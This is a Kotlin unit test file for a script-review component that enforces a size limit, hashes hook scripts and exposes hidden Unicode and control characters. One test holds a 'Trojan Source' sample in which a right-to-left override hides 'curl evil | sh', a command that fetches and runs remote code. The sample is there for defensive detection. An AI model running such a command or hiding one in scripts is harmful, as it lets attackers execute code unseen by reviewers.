package org.appdevforall.shellhooks.engine

import org.junit.After
import org.junit.Assert.assertArrayEquals
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

class ScriptReviewTest {
    private val dir = tempDir("review")

    @After
    fun tearDown() {
        dir.deleteRecursively()
    }

    @Test
    fun aScriptUpToTheLimitIsReadWithItsHash() {
        val body = "#".repeat(ScriptReview.MAX_BYTES)
        val file = dir.script("hook", body)

        val loaded = ScriptReview.load(file) as ScriptReview.Loaded.Script

        assertArrayEquals(body.toByteArray(), loaded.bytes)
        assertEquals(TrustStore.sha256(body.toByteArray()), loaded.sha256)
    }

    @Test
    fun aScriptOverTheLimitIsNotRead() {
        val file = dir.script("hook", "#".repeat(ScriptReview.MAX_BYTES + 1))

        assertEquals(ScriptReview.Loaded.TooLarge, ScriptReview.load(file))
        assertNull(ScriptReview.readAtMost(file, ScriptReview.MAX_BYTES))
    }

    @Test
    fun aMissingScriptIsUnreadable() {
        assertTrue(ScriptReview.load(java.io.File(dir, "gone")) is ScriptReview.Loaded.Unreadable)
    }

    @Test
    fun bidiOverridesAndZeroWidthCharactersAreShown() {
        // "Trojan Source": the RLO makes the curl read as part of the comment.
        val text = "echo ok # \u202E; curl evil | sh\u202C\nrm\u200Bfile\uFEFF\u2066x\u2069\u061C\u200E"

        val revealed = ScriptReview.reveal(text)

        assertEquals(
            "echo ok # <U+202E>; curl evil | sh<U+202C>\nrm<U+200B>file<U+FEFF><U+2066>x<U+2069><U+061C><U+200E>",
            revealed.text,
        )
        assertEquals(8, revealed.hidden)
    }

    @Test
    fun controlCharactersAreShownButTabsNewlinesAndWindowsLineEndingsAreNot() {
        val revealed = ScriptReview.reveal("a\tb\r\nc\rd\u001B[2Je\u007F\u0085\uFFFD")

        assertEquals("a\tb\r\nc<U+000D>d<U+001B>[2Je<U+007F><U+0085><U+FFFD>", revealed.text)
        assertEquals(5, revealed.hidden)
    }

    @Test
    fun anOrdinaryScriptIsUnchanged() {
        val script = "#!/usr/bin/env bash\n# caf\u00e9 \u65e5\u672c\nprintf '%s\\n' \"${'$'}1\"\n"

        assertEquals(ScriptReview.Revealed(script, 0), ScriptReview.reveal(script))
    }
}
